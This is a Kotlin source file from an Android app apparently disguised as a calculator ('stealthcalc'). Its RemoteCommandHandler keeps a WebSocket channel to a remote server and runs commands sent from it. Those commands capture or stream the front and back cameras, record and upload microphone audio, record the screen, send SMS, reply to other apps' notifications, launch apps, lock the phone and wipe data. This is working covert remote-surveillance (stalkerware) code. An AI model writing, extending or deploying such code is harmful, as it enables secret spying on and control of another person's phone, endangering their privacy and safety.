package com.stealthcalc.monitoring.service

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import com.stealthcalc.auth.WipeManager
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.collector.LiveCameraCollector
import com.stealthcalc.monitoring.collector.ScreenRecordCollector
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.websocket.WebSockets
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.CloseReason
import io.ktor.websocket.Frame
import io.ktor.websocket.close
import io.ktor.websocket.readText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Serializable
data class RemoteCommand(
    val type: String,
    val params: Map<String, String> = emptyMap(),
)

@Singleton
class RemoteCommandHandler @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val remoteCameraService: RemoteCameraService,
    private val liveCameraCollector: LiveCameraCollector,
    private val screenRecordCollector: ScreenRecordCollector,
    private val uploader: FileUploader,
    private val wipeManager: WipeManager,
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val json = Json { ignoreUnknownKeys = true }
    private var commandJob: Job? = null
    private var audioRecorder: MediaRecorder? = null

    fun startListening() {
        if (commandJob?.isActive == true) return
        val baseUrl = repository.serverUrl.trimEnd('/')
        if (baseUrl.isBlank() || !repository.isPaired) return
        val wsUrl = baseUrl.replace("http://", "ws://").replace("https://", "wss://")

        val client = HttpClient(OkHttp) { install(WebSockets) }

        commandJob = scope.launch {
            while (isActive) {
                runCatching {
                    client.webSocket("$wsUrl/commands/${repository.deviceId}?token=${repository.authToken}") {
                        AppLogger.log(context, "[agent]", "Command channel connected")
                        for (frame in incoming) {
                            if (frame is Frame.Text) {
                                val text = frame.readText()
                                val command = runCatching { json.decodeFromString<RemoteCommand>(text) }.getOrNull()
                                if (command != null) {
                                    handleCommand(command)
                                }
                            }
                        }
                    }
                }.onFailure { e ->
                    AppLogger.log(context, "[agent]", "Command channel error: ${e.message}")
                }
                delay(10_000)
            }
            client.close()
        }
    }

    fun stopListening() {
        commandJob?.cancel()
        commandJob = null
    }

    private suspend fun handleCommand(command: RemoteCommand) {
        AppLogger.log(context, "[agent]", "Received command: ${command.type}")
        when (command.type) {
            "capture_front" -> remoteCameraService.capturePhoto(useFrontCamera = true)
            "capture_back" -> remoteCameraService.capturePhoto(useFrontCamera = false)
            "record_audio" -> {
                val duration = command.params["duration"]?.toIntOrNull() ?: 30
                recordAudio(duration)
            }
            "ring" -> ringPhone()
            "stream_camera_front" -> liveCameraCollector.startStreaming(useFrontCamera = true)
            "stream_camera_back" -> liveCameraCollector.startStreaming(useFrontCamera = false)
            "stop_camera_stream" -> liveCameraCollector.stopStreaming()
            "screen_record" -> {
                val duration = command.params["duration"]?.toLongOrNull() ?: 30_000L
                screenRecordCollector.recordScreen(duration.coerceIn(5_000, 120_000))
            }
            "send_sms" -> {
                val to = command.params["to"] ?: return
                val body = command.params["body"] ?: return
                sendSms(to, body)
            }
            "reply_notification" -> {
                val pkg = command.params["package"] ?: return
                val text = command.params["text"] ?: return
                replyToNotification(pkg, text)
            }
            "launch_app" -> {
                val pkg = command.params["package"] ?: return
                launchApp(pkg)
            }
            "lock_device" -> lockDevice()
            "wipe_vault" -> {
                AppLogger.log(context, "[agent]", "Remote wipe triggered")
                wipeManager.wipeAll()
            }
        }
    }

    private fun lockDevice() {
        runCatching {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val activeAdmins = dpm?.activeAdmins
            if (activeAdmins?.isNotEmpty() == true) {
                dpm.lockNow()
                AppLogger.log(context, "[agent]", "Device locked via DevicePolicyManager")
            } else {
                // Fallback: dismiss keyguard guard via KeyguardManager (shows lock screen)
                val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                AppLogger.log(context, "[agent]", "No device admin — keyguard: ${km?.isDeviceLocked}")
            }
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "Lock device error: ${e.message}")
        }
    }

    private suspend fun recordAudio(durationSeconds: Int) {
        val capped = durationSeconds.coerceIn(5, 300)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "remote_audio_$timestamp.m4a")

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        runCatching {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(128_000)
            recorder.setAudioSamplingRate(44_100)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            audioRecorder = recorder

            AppLogger.log(context, "[agent]", "Remote audio recording started (${capped}s)")
            delay(capped * 1000L)

            recorder.stop()
            recorder.release()
            audioRecorder = null

            val success = uploader.uploadFile(
                file = file,
                mimeType = "audio/mp4",
                category = "remote_audio",
                capturedAt = System.currentTimeMillis(),
            )
            file.delete()

            if (success) {
                AppLogger.log(context, "[agent]", "Remote audio uploaded")
            }
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "Remote audio error: ${e.message}")
            runCatching { recorder.release() }
            audioRecorder = null
            file.delete()
        }
    }

    private fun replyToNotification(packageName: String, text: String) {
        val nls = NotificationMonitorService.instance
        if (nls == null) {
            AppLogger.log(context, "[agent]", "NLS not available for reply")
            return
        }
        val success = nls.replyToNotification(packageName, text)
        if (!success) {
            AppLogger.log(context, "[agent]", "No replyable notification found for $packageName")
        }
    }

    private fun launchApp(packageName: String) {
        runCatching {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                AppLogger.log(context, "[agent]", "Launched app: $packageName")
            } else {
                AppLogger.log(context, "[agent]", "No launch intent for $packageName")
            }
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "App launch error: ${e.message}")
        }
    }

    private fun sendSms(to: String, body: String) {
        runCatching {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(to, null, body, null, null)
            AppLogger.log(context, "[agent]", "Remote SMS sent to $to")
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "SMS send error: ${e.message}")
        }
    }

    private fun ringPhone() {
        runCatching {
            val ringtone = android.media.RingtoneManager.getRingtone(
                context,
                android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
            )
            ringtone?.play()
            scope.launch {
                delay(10_000)
                ringtone?.stop()
            }
        }
    }
}
